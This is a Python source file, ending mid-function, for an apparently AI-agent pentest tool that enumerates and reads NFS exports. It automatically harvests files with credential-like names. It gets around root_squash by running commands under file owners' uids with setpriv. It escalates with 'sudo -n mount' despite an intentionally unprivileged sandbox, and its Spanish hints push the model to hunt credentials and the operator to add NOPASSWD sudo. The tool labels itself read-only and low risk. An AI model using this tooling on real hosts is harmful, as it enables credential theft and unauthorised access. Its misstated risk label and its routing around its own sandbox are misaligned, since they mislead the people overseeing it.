"""Durable ``nexus.recon.nfs``: exports, listing and reads.

The measured dead end (run V9, Hijack): the agent found ``rpcbind``/``nfs`` and
stopped because ``mount -t nfs`` needs root and the sandbox is unprivileged on
purpose. Root is not the only way in: ``showmount -e`` enumerates exports with
no privileges at all, and the libnfs userland clients (``nfs-ls``/``nfs-cat``)
speak the protocol without a kernel mount.

It answers three actions:

* ``exports`` - ``showmount -e <target>``: the list of exported paths.
* ``list``    - ``nfs-ls nfs://<target><path>``: names inside one export.
* ``read``    - ``nfs-cat nfs://<target><path>/<file>``: bytes of one file.

Two measured gaps pushed the rest of the handler:

* when the userland client is not installed but the exports are visible, the
  answer is ``outcome="partial"`` carrying both facts and the message the
  operator needs: the share exists, an unprivileged read is still possible, and
  ``nexus.system.install_tool`` can install ``libnfs-utils``. A missing
  ``showmount`` is ``unavailable`` (the run cannot see the surface at all) and
  names ``nfs-common`` as the install;
* ``nfs-ls`` speaks AUTH_SYS as uid 0, so an export with ``root_squash`` (or one
  that only trusts another subnet) answers ``NFS3ERR_ACCES`` and the loot stays
  one ``mount`` away -hijack_v7 lost seventeen turns there-. The handler then
  falls back to a real kernel mount: the mount the operator already made is
  reused as-is (read with plain ``find``/``cat``, no sudo), and otherwise
  ``sudo -n mount`` mounts into a workspace-local mountpoint that is always
  unmounted afterwards. ``NEXUS_NFS_MOUNT=off`` disables that fallback.

Nothing is ever run through a shell: the binaries are executed directly inside
the same sandbox as every other recon handler, and every argv is built here.
"""

from __future__ import annotations

import hashlib
import os
import re
import shutil
from pathlib import Path
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import (
    OCISandbox,
    sandbox_for_environment,
    sandbox_path,
)

from ._exec import run_in_sandbox
from ._loot import decode_base64_text, loot_summary

#: Actions the tool declares (the schema publishes exactly these values).
NFS_ACTIONS: tuple[str, ...] = ("exports", "list", "read")

#: Programs the handler may execute. ``showmount`` enumerates; ``nfs-ls`` and
#: ``nfs-cat`` read through libnfs without a kernel mount; ``sudo``/``mount``/
#: ``umount``/``find``/``cat`` are the kernel-mount fallback (see
#: :func:`_mount_fallback`). Every argv is built here, so the allowlist is never
#: a shell: the model picks the target, never the command line.
NFS_ALLOWED_PROGRAMS: tuple[str, ...] = (
    "showmount", "nfs-ls", "nfs-cat", "sudo", "mount", "umount", "find", "cat",
    # ``stat``/``setpriv`` implement the UID mapping an export with
    # ``root_squash`` forces: root is mapped to ``nobody``, so a file owned by
    # uid 1002 with mode 600 is unreadable *as root* and readable only as that
    # uid. The Hijack writeups create a local user with the same uid; the
    # sandbox cannot, but ``setpriv --reuid`` drops to it for one command.
    "stat", "setpriv",
)

NFS_DEFAULT_TIMEOUT_SECONDS = 60
NFS_MAX_TIMEOUT_SECONDS = 300

#: Cap on listing lines and read bytes that travel back in the observation.
NFS_MAX_LISTING_LINES = 500
NFS_MAX_READ_BYTES = 200_000

#: The message the operator needs when the exports are visible but the
#: userland client is missing (the plan's FIX 2 wording).
NFS_MOUNT_GUIDANCE = (
    "Directorio NFS detectado. Solicita al humano que monte el recurso o usa "
    "`nfs-ls` si está disponible."
)

#: What to do when the userland client ran and the server refused the read.
NFS_FAILED_HINT = (
    "El cliente userland arrancó pero la lectura no se completó. Lee el `stderr`: "
    "`permission denied`/`access denied` significa que el export restringe tu "
    "cliente (prueba desde otro host o pide al humano que monte el recurso); "
    "`no such file` significa que `path` no es un export de la lista. Si el "
    "vector está cerrado, registra un barrier con nexus.knowledge.record_fact "
    "(key \"<host>:2049\") y pivota."
)

#: Kernel-mount fallback (FIX 5.2). The libnfs client speaks AUTH_SYS as uid 0;
#: an export with ``root_squash`` (or one that only trusts a subnet the client
#: is not in) answers ``NFS3ERR_ACCES`` and the run stops with the loot one
#: ``mount`` away. A kernel mount runs as the operator, so it sees the same
#: POSIX tree the human sees. Disabled only by an explicit environment value.
NFS_MOUNT_ENV = "NEXUS_NFS_MOUNT"
NFS_MOUNT_DISABLED_VALUES: frozenset[str] = frozenset({"0", "off", "false", "no"})

#: Directory (inside the engagement workspace) the fallback mounts into. One
#: mountpoint per export: ``.nexus-nfs/-mnt-share-ab12cd34``.
NFS_MOUNT_ROOT_DIRNAME = ".nexus-nfs"

#: Mount options. ``soft``/``timeo``/``retrans`` keep a hung server from eating
#: the run's whole budget: the server answers or the mount gives up in seconds.
NFS_MOUNT_OPTIONS = "vers=3,nolock,soft,timeo=50,retrans=2"

#: Depth and width of the listing read from a mounted export.
NFS_MOUNT_FIND_MAXDEPTH = 3

#: Auto-loot: a listing is worth much more with the first bytes of the files in
#: it. Measured in Hijack (the room this exists for): the export holds an FTP
#: credential in a text file, the model listed the directory, and then spent
#: turns guessing file names instead of reading the one that matters. The cap
#: keeps one call bounded: six files, eight KB each, fifteen seconds each.
NFS_LOOT_MAX_FILES = 6
NFS_LOOT_MAX_BYTES = 8_192
NFS_LOOT_TIMEOUT_SECONDS = 15

#: Why the fallback could not run, spelled out for the model and the operator.
NFS_MOUNT_FAILED_HINT = (
    "El montaje del kernel tampoco funcionó. `sudo -n mount` exige sudo sin "
    "contraseña para este usuario: si el error es 'a password is required', el "
    "operador debe ejecutar `sudo mount -t nfs -o {options} <target>:<export> "
    "<punto>` en su terminal (o añadir NOPASSWD en visudo) y repetir esta "
    "llamada: el handler detecta el montaje ya hecho en /proc/self/mounts y lee "
    "de él sin sudo. También puedes probar `nexus.shell.exec` con opciones "
    "distintas (vers=4, port=...)."
)

#: Install hint appended when the required binary is absent from the sandbox.
NFS_INSTALL_GUIDANCE = {
    "showmount": (
        "Falta `showmount` en el sandbox. Instálalo con "
        "nexus.system.install_tool(tool_name=\"nfs-common\") (el operador "
        "aprueba el comando) y reintenta."
    ),
    "nfs-ls": (
        "Falta `nfs-ls` en el sandbox. Instala el cliente userland con "
        "nexus.system.install_tool(tool_name=\"libnfs-utils\") para leer el "
        "export sin root."
    ),
    "nfs-cat": (
        "Falta `nfs-cat` en el sandbox. Instala el cliente userland con "
        "nexus.system.install_tool(tool_name=\"libnfs-utils\") para leer el "
        "export sin root."
    ),
}


def resolve_program(program: str) -> str:
    """Absolute path of *program* when the sandbox PATH hides the sbin dirs.

    The measured surprise on this Kali host: ``showmount`` lives in
    ``/usr/sbin`` and the sandbox PATH is ``/usr/local/bin:/usr/bin:/bin``, so a
    perfectly installed ``nfs-common`` was reported as missing. Resolution uses
    the sandbox PATH *plus* the sbin directories, and the resolved path is what
    the sandbox allowlist receives, so the same binary the operator sees is the
    one that runs. The OCI image is untouched (its paths are its own).
    """
    directories = f"{sandbox_path()}:/usr/sbin:/sbin:/usr/local/sbin"
    found = shutil.which(program, path=directories)
    return found or program


def _sandbox(workspace_root: str) -> tuple[Any, dict[str, str]]:
    """Build the sandbox and the program map (bare name -> argv[0] to run)."""
    sandbox = sandbox_for_environment(workspace_root, allowed_programs=NFS_ALLOWED_PROGRAMS)
    programs = {name: name for name in NFS_ALLOWED_PROGRAMS}
    if isinstance(sandbox, OCISandbox):
        return sandbox, programs
    programs = {name: resolve_program(name) for name in NFS_ALLOWED_PROGRAMS}
    if any(path != name for name, path in programs.items()):
        sandbox = sandbox_for_environment(
            workspace_root, allowed_programs=tuple(dict.fromkeys(programs.values()))
        )
    return sandbox, programs


def _validate_text(value: Any, name: str, *, max_length: int) -> str:
    """Trimmed text argument; empty, over-long or control-bearing is refused."""
    text = str(value or "").strip()
    if not text:
        raise ValueError(f"{name} is required")
    if len(text) > max_length:
        raise ValueError(f"{name} is too long")
    if any(ord(char) < 0x20 for char in text):
        raise ValueError(f"{name} contains control characters")
    return text


def _export_path(value: Any) -> str:
    """Normalize an export path to ``/path`` (a bare ``srv/nfs`` is accepted)."""
    text = _validate_text(value, "path", max_length=1024)
    if not text.startswith("/"):
        text = "/" + text
    return text


def nfs_mount_allowed() -> bool:
    """Whether the kernel-mount fallback may run (``NEXUS_NFS_MOUNT=off`` opts out)."""
    value = str(os.getenv(NFS_MOUNT_ENV, "") or "").strip().lower()
    return value not in NFS_MOUNT_DISABLED_VALUES


def _mount_device(target: str, path: str) -> str:
    """``host:/export`` as the kernel writes it in ``/proc/self/mounts``."""
    return f"{target}:{path}"


def _unescape_mount_field(value: str) -> str:
    """Undo the octal escapes the kernel uses for spaces in mount fields."""
    return re.sub(r"\\([0-7]{3})", lambda match: chr(int(match.group(1), 8)), value)


def existing_mountpoint(target: str, path: str, mounts: str | None = None) -> str | None:
    """Local mountpoint an operator already mounted for this export, if any.

    The measured operator workflow is to mount the share by hand and tell the
    agent it can use it. Refusing to look at that mount would be the same dead
    end as before, so the handler reuses it -with no sudo at all- before trying
    to mount anything itself.
    """
    device = _mount_device(target, path)
    try:
        text = mounts if mounts is not None else Path("/proc/self/mounts").read_text(
            encoding="utf-8", errors="replace"
        )
    except OSError:
        return None
    for line in text.splitlines():
        fields = line.split()
        if len(fields) < 2:
            continue
        if _unescape_mount_field(fields[0]) != device:
            continue
        mountpoint = _unescape_mount_field(fields[1])
        if mountpoint and os.path.isdir(mountpoint):
            return mountpoint
    return None


def _mountpoint_for(workspace_root: str, target: str, path: str) -> Path:
    """Workspace-local, deterministic mountpoint for one export."""
    digest = hashlib.sha256(f"{target}:{path}".encode("utf-8")).hexdigest()[:8]
    slug = re.sub(r"[^A-Za-z0-9]+", "-", path).strip("-")[:40] or "export"
    return Path(workspace_root) / NFS_MOUNT_ROOT_DIRNAME / f"{slug}-{digest}"


def _safe_child(root: str, name: str) -> str | None:
    """``root/name`` when it stays inside ``root``, else ``None`` (no traversal)."""
    text = str(name or "").strip().lstrip("/")
    if not text:
        return None
    candidate = (Path(root) / text).resolve()
    base = Path(root).resolve()
    if candidate != base and base not in candidate.parents:
        return None
    return str(candidate)


def _nfs_url(target: str, path: str, file: str | None = None) -> str:
    """``nfs://host/export[/file]`` URL the libnfs clients understand."""
    url = f"nfs://{target}{path}"
    if file:
        url = f"{url.rstrip('/')}/{file.lstrip('/')}"
    return url


def parse_exports(stdout: str) -> list[dict[str, Any]]:
    """Parse ``showmount -e`` into ``[{"path": …, "clients": […]}]``.

    The first line is the ``Export list for <host>:`` header (older builds print
    it with a trailing space). Blank lines and anything before the header are
    ignored, so a warning printed by rpcbind never becomes an export.
    """
    entries: list[dict[str, Any]] = []
    header_seen = False
    for raw in str(stdout or "").splitlines():
        line = raw.strip()
        if not line:
            continue
        if not header_seen:
            if line.lower().startswith("export list for"):
                header_seen = True
                continue
            # A build without the header still prints ``/path client`` lines.
            if not line.startswith("/"):
                continue
        parts = line.split()
        path = parts[0]
        if not path.startswith("/"):
            continue
        entries.append({"path": path, "clients": parts[1:]})
    return entries


async def _exports(
    sandbox: Any, target: str, timeout_seconds: int, *, program: str = "showmount"
) -> tuple[Any | None, list[dict[str, Any]]]:
    """Run ``showmount -e``; return ``(result or None, exports)``.

    ``None`` means the binary is not in the sandbox: the caller turns that into
    ``unavailable`` with the install hint instead of a phantom empty list.
    """
    try:
        result = await run_in_sandbox(
            sandbox,
            [program, "-e", target],
            timeout_seconds=timeout_seconds,
            image_env="NEXUS_NFS_IMAGE",
            default_image="python:3.12-alpine",
        )
    except (FileNotFoundError, PermissionError):
        return None, []
    return result, parse_exports(result.stdout)


def nfs_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.recon.nfs``."""
    return ToolDefinition(
        tool_id="nexus.recon.nfs",
        effect="read_only",
        name="NFS recon (no root)",
        tenant_id=tenant_id,
        description=(
            "Enumera exports NFS con showmount -e y los lee con nfs-ls/nfs-cat "
            "(libnfs); si el export rechaza al cliente userland, monta el export "
            "con `sudo -n mount` (o reutiliza el montaje que el operador ya hizo) "
            "y lee de ahí. action={\"list\"} SIN path lista TODOS los exports y "
            "devuelve el contenido de los ficheros de texto pequeños (busca "
            "credenciales ahí). action=exports solo la tabla; action=read "
            "(path + file) un fichero concreto."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "target": {"type": "string", "minLength": 1, "maxLength": 255},
                "action": {"type": "string", "enum": list(NFS_ACTIONS)},
                "path": {"type": "string", "minLength": 1, "maxLength": 1024},
                "file": {"type": "string", "minLength": 1, "maxLength": 1024},
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 5,
                    "maximum": NFS_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["target"],
            "additionalProperties": False,
        },
        risk=RiskLevel.LOW,
        scope_required=True,
        scope_target_field="target",
        required_permissions=["execute:tool:nexus.recon.nfs"],
        timeout_seconds=NFS_MAX_TIMEOUT_SECONDS + 60,
        max_output_bytes=2_000_000,
    )


async def nfs_handler(arguments: dict[str, Any], context: RunContext) -> ToolResult:
    """Enumerate or read an NFS export without mounting it."""
    target = _validate_text(arguments.get("target"), "target", max_length=255)
    action = str(arguments.get("action") or "exports").strip().lower()
    if action not in NFS_ACTIONS:
        raise ValueError(f"unsupported nfs action: {action!r}")
    path = _export_path(arguments["path"]) if arguments.get("path") else ""
    if action == "read" and not path:
        raise ValueError("action=read requires path (the NFS export)")
    file = _validate_text(arguments.get("file"), "file", max_length=1024) if action == "read" else ""
    if action == "read" and not file:
        raise ValueError("action=read requires file")

    requested = arguments.get("timeout_seconds")
    timeout_seconds = min(
        NFS_MAX_TIMEOUT_SECONDS,
        max(5, int(requested) if requested else NFS_DEFAULT_TIMEOUT_SECONDS),
    )
    if action == "list" and not path:
        # ``list`` without a path is the whole surface: enumerate every export
        # and list it, instead of making the model guess the export name (Hijack
        # v7 asked for ``/mnt/share`` on an export that is ``/``).
        return await _list_every_export(
            target, timeout_seconds, context, arguments
        )

    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    sandbox, programs = _sandbox(workspace_root)

    evidence: dict[str, Any] = {
        "action": action,
        "target": target,
        "noise_level": "low",
        "timeout_seconds": timeout_seconds,
        **({"path": path} if path else {}),
        **({"file": file} if file else {}),
    }

    if action == "exports":
        result, exports = await _exports(
            sandbox, target, timeout_seconds, program=programs["showmount"]
        )
        if result is None:
            return ToolResult(
                output={
                    "error": "showmount is not available in the sandbox",
                    "target": target,
                    "guidance": NFS_INSTALL_GUIDANCE["showmount"],
                },
                verified=False,
                outcome="unavailable",
                verification_method="nfs_showmount_unavailable",
                evidence=evidence,
            )
        return _exports_result(result, exports, evidence, target=target)

    program = "nfs-ls" if action == "list" else "nfs-cat"
    url = _nfs_url(target, path, file if action == "read" else None)
    try:
        result = await run_in_sandbox(
            sandbox,
            [programs[program], url],
            timeout_seconds=timeout_seconds,
            image_env="NEXUS_NFS_IMAGE",
            default_image="python:3.12-alpine",
        )
    except (FileNotFoundError, PermissionError):
        # The userland client is missing: the kernel mount does not need it, so
        # try that before reporting what *is* visible (the exports).
        mounted, mount_error = await _mount_fallback(
            sandbox, programs, target=target, path=path, action=action, file=file,
            timeout_seconds=timeout_seconds, workspace_root=workspace_root,
        )
        if mounted is not None:
            return mounted
        _, exports = await _exports(
            sandbox, target, timeout_seconds, program=programs["showmount"]
        )
        evidence["exports"] = exports
        evidence["partial_reason"] = f"{program}_missing"
        evidence["mount_error"] = mount_error
        return ToolResult(
            output={
                "target": target,
                "action": action,
                "path": path,
                "exports": exports,
                "partial": True,
                # Machine-readable reason first (the loop and the operator read
                # it), then the human message and the one action that unblocks
                # the vector. Measured in Hijack v3: the model had this answer
                # and still burned 23 pyNfsClient calls instead of installing
                # the client.
                "error": "userland_client_missing",
                "message": NFS_MOUNT_GUIDANCE,
                "hint": NFS_INSTALL_GUIDANCE[program],
                "guidance": NFS_INSTALL_GUIDANCE[program],
                "mount_hint": NFS_MOUNT_FAILED_HINT.format(options=NFS_MOUNT_OPTIONS),
                "mount_error": mount_error,
            },
            verified=False,
            outcome="partial",
            verification_method=f"nfs_{program.replace('-', '_')}_missing",
            evidence=evidence,
        )

    if result.timed_out:
        return ToolResult(
            output={"error": f"{program} timed out", "target": target, "action": action},
            verified=False,
            outcome="timeout",
            verification_method=f"nfs_{program.replace('-', '_')}_timeout",
            evidence=evidence,
            exit_code=result.exit_code,
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=True,
        )

    if result.exit_code != 0:
        # The client ran and the server refused (``NFS3ERR_ACCES``: the export
        # root-squashes AUTH_SYS uid 0, or only trusts a subnet). A kernel mount
        # runs as the operator, so it is the next attempt, not a dead end.
        mounted, mount_error = await _mount_fallback(
            sandbox, programs, target=target, path=path, action=action, file=file,
            timeout_seconds=timeout_seconds, workspace_root=workspace_root,
        )
        if mounted is not None:
            return mounted
        # The exports travel with the refusal so the model can see what it *can*
        # reach, and the outcome stays partial.
        _, exports = await _exports(
            sandbox, target, timeout_seconds, program=programs["showmount"]
        )
        evidence["exports"] = exports
        evidence["exit_code"] = result.exit_code
        evidence["partial_reason"] = f"{program}_failed"
        evidence["mount_error"] = mount_error
        return ToolResult(
            output={
                "target": target,
                "action": action,
                "path": path,
                "exports": exports,
                "partial": True,
                "error": "mount_failed",
                "message": NFS_MOUNT_GUIDANCE,
                "hint": NFS_FAILED_HINT,
                "mount_hint": NFS_MOUNT_FAILED_HINT.format(options=NFS_MOUNT_OPTIONS),
                "mount_error": mount_error,
                "stdout": result.stdout[:2_000],
                "stderr": result.stderr[:2_000],
            },
            verified=False,
            outcome="partial",
            verification_method=f"nfs_{program.replace('-', '_')}_failed",
            evidence=evidence,
            exit_code=result.exit_code,
            stdout=result.stdout,
            stderr=result.stderr,
        )

    if action == "list":
        lines = [line for line in str(result.stdout or "").splitlines() if line.strip()]
        evidence["entries_total"] = len(lines)
        evidence["entries_truncated"] = len(lines) > NFS_MAX_LISTING_LINES
        if not lines:
            # An empty listing is a real observation, not a success with nothing
            # in it: the model must not read it as "there is something here".
            return ToolResult(
                output={
                    "target": target,
                    "action": action,
                    "path": path,
                    "entries": [],
                    "count": 0,
                    "message": (
                        "El export está vacío: el cliente userland leyó el directorio y "
                        "no devolvió entradas. Prueba otro export de la lista o lee un "
                        "fichero concreto con action=read."
                    ),
                },
                verified=True,
                outcome="negative",
                verification_method="nfs_listing_empty",
                evidence=evidence,
                exit_code=result.exit_code,
                stdout=result.stdout,
                stderr=result.stderr,
            )
        loot = await _userland_loot(sandbox, programs, target, path, lines)
        evidence["files_read"] = int(loot.get("files_total") or 0)
        evidence["credentials_found"] = len(loot.get("credentials") or [])
        return ToolResult(
            output={
                "target": target,
                "action": action,
                "path": path,
                "entries": lines[:NFS_MAX_LISTING_LINES],
                "count": len(lines[:NFS_MAX_LISTING_LINES]),
                "truncated": len(lines) > NFS_MAX_LISTING_LINES,
                **loot,
            },
            verified=True,
            verification_method="nfs_listing_parsed",
            evidence=evidence,
            exit_code=result.exit_code,
            stdout=result.stdout,
            stderr=result.stderr,
        )

    content = str(result.stdout or "")
    truncated = len(content.encode("utf-8", "replace")) > NFS_MAX_READ_BYTES
    evidence["file"] = file
    evidence["bytes_total"] = len(content.encode("utf-8", "replace"))
    evidence["read_truncated"] = truncated
    return ToolResult(
        output={
            "target": target,
            "action": action,
            "path": path,
            "file": file,
            "preview": content[:NFS_MAX_READ_BYTES],
            "truncated": truncated,
        },
        verified=bool(content) and not truncated,
        outcome="" if content else "negative",
        verification_method="nfs_file_read" if content else "nfs_file_empty",
        evidence=evidence,
        exit_code=result.exit_code,
        stdout=content[:NFS_MAX_READ_BYTES],
        stderr=result.stderr,
    )


#: stderr fragments that mean "nothing is listening", not "the answer is no".
#: ``showmount`` prints these when rpcbind/mountd are closed or filtered, which
#: is an infrastructure answer (``unavailable``), never an empty export table
#: (``negative``) -the V1-16 boundary between "could not look" and "looked".
_NFS_UNREACHABLE_HINTS: tuple[str, ...] = (
    "clnt_create",
    "unable to receive",
    "program not registered",
    "rpc: timed out",
    "no route to host",
    "connection refused",
)


def _unreachable(result: Any) -> bool:
    text = f"{result.stdout or ''}\n{result.stderr or ''}".lower()
    return any(hint in text for hint in _NFS_UNREACHABLE_HINTS)


def _exports_result(
    result: Any,
    exports: list[dict[str, Any]],
    evidence: dict[str, Any],
    *,
    target: str,
) -> ToolResult:
    """Turn one ``showmount -e`` run into the observable exports result.

    Three answers are kept distinct, because they tell the agent to do different
    things: the command ran and the table is empty (``verified``: this host
    exports nothing), the RPC layer refused (*unavailable*: rpcbind/mountd are
    closed or filtered, pivot or retry later) and any other failure
    (``negative``, with the real stderr).
    """
    evidence["exports_total"] = len(exports)
    evidence["exit_code"] = result.exit_code
    ok = result.exit_code == 0
    unreachable = not ok and _unreachable(result)
    evidence["reachable"] = not unreachable
    output: dict[str, Any] = {
        "target": target,
        "action": "exports",
        "exports": exports,
        "count": len(exports),
        "stdout": result.stdout[:4_000],
        "stderr": result.stderr[:2_000],
    }
    if ok and exports:
        # The export table is the *surface*, not the contents: say what the next
        # call is and what it needs, so a success here is never read as "NFS
        # enumerated" (Hijack v3 spent 23 calls importing pyNfsClient).
        output["next_steps"] = [
            "Lo más rápido: nexus.recon.nfs(target=..., action=\"list\") SIN path "
            "-lista todos los exports y el contenido de los ficheros de texto "
            "pequeños, que es donde suelen estar las credenciales-.",
            "Para ver el contenido de un export concreto: "
            'nexus.recon.nfs(target=..., action="list", path="<export>").',
            "action=list usa el cliente userland `nfs-ls` (paquete `libnfs-utils`); "
            "si falta o el export lo rechaza, el handler monta el export con "
            "`sudo -n mount` y lee de ahí (mismo action=list, mismo path).",
        ]
    return ToolResult(
        output=output,
        verified=ok,
        outcome="" if ok else ("unavailable" if unreachable else "negative"),
        verification_method=(
            "nfs_exports_parsed" if ok
            else "nfs_exports_unavailable" if unreachable
            else "nfs_exports_failed"
        ),
        evidence=evidence,
        exit_code=result.exit_code,
        stdout=result.stdout,
        stderr=result.stderr,
    )


#: Names that usually hold the loot in a share, and the system trees that are
#: noise when the export is ``/`` (the Hijack case). The auto-loot reads a few
#: files; picking ``/etc/hostname`` over ``/mnt/share/for_you.txt`` wastes the
#: one answer it gets.
_LOOT_INTERESTING = (
    "pass", "cred", "note", "user", "key", "secret", "hash", "for_you",
    "readme", "todo", "ftp", "admin", "backup", "config", "flag",
)
_LOOT_NOISE = ("etc/", "usr/", "lib/", "bin/", "sbin/", "boot/", "dev/", "proc/", "sys/")


def _loot_rank(relative: str) -> tuple[int, int]:
    """Sort key: interesting names first, system trees last."""
    lower = str(relative or "").lower()
    if any(word in lower for word in _LOOT_INTERESTING):
        return (0, len(lower))
    if lower.startswith(_LOOT_NOISE):
        return (2, len(lower))
    return (1, len(lower))


def _permission_denied(*texts: Any) -> bool:
    """Whether a failure is the export's uid mapping, not a missing path."""
    blob = " ".join(str(text or "") for text in texts).lower()
    return any(
        hint in blob
        for hint in ("permission denied", "access denied", "nfs3err_acces", "eacces")
    )


async def _cat_with_prefix(
    sandbox: Any,
    programs: dict[str, str],
    prefix: list[str],
    path: str,
    *,
    timeout_seconds: float,
) -> Any | None:
    """Run ``cat path`` under ``prefix``; ``None`` when it cannot run at all."""
    try:
        return await run_in_sandbox(
            sandbox,
            [*prefix, programs["cat"], path],
            timeout_seconds=timeout_seconds,
            image_env="NEXUS_NFS_IMAGE",
            default_image="python:3.12-alpine",
        )
    except (FileNotFoundError, PermissionError):
        return None


async def _uid_prefix(
    sandbox: Any,
    programs: dict[str, str],
    prefix: list[str],
    root: str,
) -> list[str]:
    """``prefix`` + ``setpriv`` as the numeric owner when root is squashed.

    This is the writeup's "create a local user with the same uid", without
    creating a user: ``setpriv --reuid=<uid> --regid=<gid> --clear-groups`` runs
    one command as that uid. When the owner is root (or ``stat``/``setpriv`` are
    not available) the original prefix is returned unchanged.
    """
    try:
        result = await run_in_sandbox(
            sandbox,
            [*prefix, programs["stat"], "-c", "%u:%g", root],
            timeout_seconds=15,
            image_env="NEXUS_NFS_IMAGE",
            default_image="python:3.12-alpine",
        )
    except (FileNotFoundError, PermissionError):
        return prefix
    match = re.fullmatch(r"(\d+):(\d+)", str(result.stdout or "").strip())
    if match is None:
        return prefix
    uid, gid = match.groups()
    if uid == "0":
        return prefix
    return [
        *prefix,
        programs["setpriv"],
        f"--reuid={uid}",
        f"--regid={gid}",
        "--clear-groups",
    ]


async def _userland_loot(
    sandbox: Any,
    programs: dict[str, str],
    target: str,
    path: str,
    entries: list[str],
) -> dict[str, Any]:
    """Read a few files through ``nfs-cat`` without mounting anything."""
    candidates: list[str] = []
    for raw in entries:
        name = str(raw or "").strip()
        if not name or name in {".", ".."} or name.endswith("/"):
            continue
        candidates.append(name)
    candidates.sort(key=_loot_rank)
    candidates = candidates[:NFS_LOOT_MAX_FILES]
    files: list[dict[str, Any]] = []
    for name in candidates:
        try:
            result = await run_in_sandbox(
                sandbox,
                [programs["nfs-cat"], _nfs_url(target, path, name)],
                timeout_seconds=NFS_LOOT_TIMEOUT_SECONDS,
                image_env="NEXUS_NFS_IMAGE",
                default_image="python:3.12-alpine",
            )
        except (FileNotFoundError, PermissionError):
            break
        if result.timed_out or result.exit_code != 0:
            continue
        content = str(result.stdout or "")
        if not content:
            continue
        item: dict[str, Any] = {
            "name": name,
            "size": len(content),
            "preview": content[:NFS_LOOT_MAX_BYTES],
        }
        decoded = decode_base64_text(content)
        if decoded is not None:
            item["decoded"] = decoded[:NFS_LOOT_MAX_BYTES]
        files.append(item)
    return loot_summary(files)


async def _discover_export_uid(
    sandbox: Any,
    programs: dict[str, str],
    prefix: list[str],
    mountpoint: str,
) -> str | None:
    """Numeric owner of an entry in a root-squashed export, if there is one.

    This is the human's step in the Hijack writeups: "file access denied, files
    owned by uid 1002, create a local user with that uid". The sandbox does not
    create users, but ``setpriv --reuid`` reaches the same place. ``nobody``
    (65534) means the mount already maps root there, so it is not a candidate.
    """
    try:
        result = await run_in_sandbox(
            sandbox,
            [
                *prefix, programs["find"], mountpoint,
                "-maxdepth", "1", "-printf", "%u\n",
            ],
            timeout_seconds=20,
            image_env="NEXUS_NFS_IMAGE",
            default_image="python:3.12-alpine",
        )
    except (FileNotFoundError, PermissionError):
        return None
    for raw in str(result.stdout or "").splitlines():
        uid = raw.strip()
        if uid.isdigit() and uid not in {"0", "65534"}:
            return uid
    return None


async def _mount_loot(
    sandbox: Any,
    programs: dict[str, str],
    mountpoint: str,
    lines: list[str],
    prefix: list[str],
) -> dict[str, Any]:
    """Read the small regular files of a mounted export (bounded)."""
    selected: list[str] = []
    for line in lines:
        parts = line.split(maxsplit=2)
        if len(parts) < 3 or parts[0] != "f":
            continue
        try:
            size = int(parts[1])
        except ValueError:
            size = 0
        if size > NFS_LOOT_MAX_BYTES:
            continue
        selected.append(parts[2].strip())
    selected.sort(key=_loot_rank)
    selected = selected[:NFS_LOOT_MAX_FILES]
    files: list[dict[str, Any]] = []
    current = prefix
    for relative in selected:
        child = _safe_child(mountpoint, relative)
        if child is None:
            continue
        result = await _cat_with_prefix(
            sandbox, programs, current, child, timeout_seconds=NFS_LOOT_TIMEOUT_SECONDS
        )
        if result is not None and result.exit_code != 0 and _permission_denied(
            result.stderr, result.stdout
        ):
            # The *file's* owner, not the export root: a 700 directory can be
            # traversed by its own uid and by nobody else.
            current = await _uid_prefix(sandbox, programs, prefix, child)
            result = await _cat_with_prefix(
                sandbox, programs, current, child,
                timeout_seconds=NFS_LOOT_TIMEOUT_SECONDS,
            )
        if result is None or result.exit_code != 0 or result.timed_out:
            continue
        content = str(result.stdout or "")
        decoded = decode_base64_text(content)
        item: dict[str, Any] = {
            "path": relative,
            "size": len(content),
            "preview": content[:NFS_LOOT_MAX_BYTES],
        }
        if decoded is not None:
            item["decoded"] = decoded[:NFS_LOOT_MAX_BYTES]
        files.append(item)
    return loot_summary(files)


async def _mount_fallback(
    sandbox: Any,
    programs: dict[str, str],
    *,
    target: str,
    path: str,
    action: str,
    file: str,
    timeout_seconds: int,
    workspace_root: str,
) -> tuple[ToolResult | None, str]:
    """Read an export through a real kernel mount; ``(result, error)``.

    Two ways in, in order of privilege: the mount the operator already made
    (found in ``/proc/self/mounts``, read with plain ``find``/``cat``) and a
    ``sudo -n mount`` into a workspace-local mountpoint that is always unmounted
    afterwards. ``error`` is empty on success and carries the reason otherwise,
    so the caller keeps the userland refusal *and* the mount refusal together.
    """
    mountpoint = existing_mountpoint(target, path)
    mounted_here = False
    evidence: dict[str, Any] = {"via": "kernel_mount"}
    if mountpoint is None:
        if not nfs_mount_allowed():
            return None, f"mount fallback disabled by {NFS_MOUNT_ENV}"
        directory = _mountpoint_for(workspace_root, target, path)
        try:
            directory.mkdir(parents=True, exist_ok=True)
        except OSError as exc:
            return None, f"mountpoint could not be created: {exc}"
        mountpoint = str(directory)
        argv = [
            programs["sudo"], "-n", programs["mount"], "-t", "nfs",
            "-o", NFS_MOUNT_OPTIONS, _mount_device(target, path), mountpoint,
        ]
        try:
            mount = await run_in_sandbox(
                sandbox,
                argv,
                timeout_seconds=min(int(timeout_seconds), 60),
                image_env="NEXUS_NFS_IMAGE",
                default_image="python:3.12-alpine",
            )
        except (FileNotFoundError, PermissionError) as exc:
            return None, f"mount binary is not available: {exc}"
        evidence["mount_options"] = NFS_MOUNT_OPTIONS
        evidence["mount_exit_code"] = mount.exit_code
        if mount.timed_out or mount.exit_code != 0:
            detail = (mount.stderr or mount.stdout or "").strip()[:2_000]
            return None, detail or f"mount exited with {mount.exit_code}"
        mounted_here = True

    evidence["mountpoint"] = mountpoint
    evidence["mounted_by_operator"] = not mounted_here
    # ``sudo -n`` only when this handler made the mount: the operator's own
    # mount is readable by the operator, and asking for root there would turn a
    # working path into a permission prompt.
    elevate = [programs["sudo"], "-n"] if mounted_here else []
    try:
        if action == "list":
            command = [
                *elevate, programs["find"], mountpoint,
                "-maxdepth", str(NFS_MOUNT_FIND_MAXDEPTH),
                "-printf", "%y %10s %p\\n",
            ]
            result = await run_in_sandbox(
                sandbox, command, timeout_seconds=min(int(timeout_seconds), 120),
